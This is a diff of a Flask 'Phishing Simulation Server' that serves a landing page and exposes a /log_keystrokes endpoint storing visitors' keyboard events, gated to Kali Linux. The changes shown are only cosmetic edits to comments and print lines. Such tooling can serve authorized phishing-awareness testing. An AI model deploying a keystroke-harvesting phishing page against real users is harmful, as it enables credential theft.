@@ -17,7 +17,7 @@ LOG_DIR = PROJECT_ROOT / "keyboard_logs"
 LOG_DIR.mkdir(exist_ok=True)
 
 def is_kali_linux():
-    """Check if running on Kali Linux"""
+    #Check if running on Kali Linux
     try:
         if os.path.exists('/etc/os-release'):
             with open('/etc/os-release', 'r') as f:
@@ -28,13 +28,13 @@ def is_kali_linux():
         return False
 
 def get_file_path(filename):
-    """Get file path, checking both Inbox and project root"""
-    # First check Inbox folder
+    
+    # First check Inbox folder path
     inbox_path = PROJECT_ROOT / 'Inbox' / filename
     if inbox_path.exists():
         return inbox_path
     
-    # Then check project root
+    # Then check project root path
     root_path = PROJECT_ROOT / filename
     if root_path.exists():
         return root_path
@@ -44,7 +44,7 @@ def get_file_path(filename):
 
 @app.route('/')
 def serve_landing_page():
-    """Serve the main landing page"""
+    # Landing page route
     file_path = get_file_path('Landing-Page.html')
     if file_path:
         return send_file(str(file_path))
@@ -52,7 +52,7 @@ def serve_landing_page():
 
 @app.route('/log_keystrokes', methods=['POST'])
 def log_keystrokes():
-    """Endpoint to receive keyboard event data"""
+    # Check Kali environment
     try:
         if not is_kali_linux():
             return jsonify({"error": "This endpoint is only available on Kali Linux"}), 403
@@ -101,8 +101,8 @@ def serve_css(filename):
 
 @app.route('/<path:filename>')
 def serve_inbox_files(filename):
-    """Serve files from Inbox directory or project root"""
-    # Security check - only allow certain files
+    
+    # Security check (only allowable files)
     allowed_extensions = {'.html', '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico'}
     file_path = Path(filename)
     
@@ -122,12 +122,12 @@ def serve_inbox_files(filename):
     return "File not found", 404
 
 if __name__ == '__main__':
-    print("=" * 60)
+   
     print("Phishing Simulation Server")
     print(f"Running on Kali Linux: {is_kali_linux()}")
     print(f"Project root: {PROJECT_ROOT}")
     print(f"Server starting on http://localhost:8080")
-    print("=" * 60)
+    
     
     # Check if Landing-Page.html exists anywhere
     landing_page_path = get_file_path('Landing-Page.html')
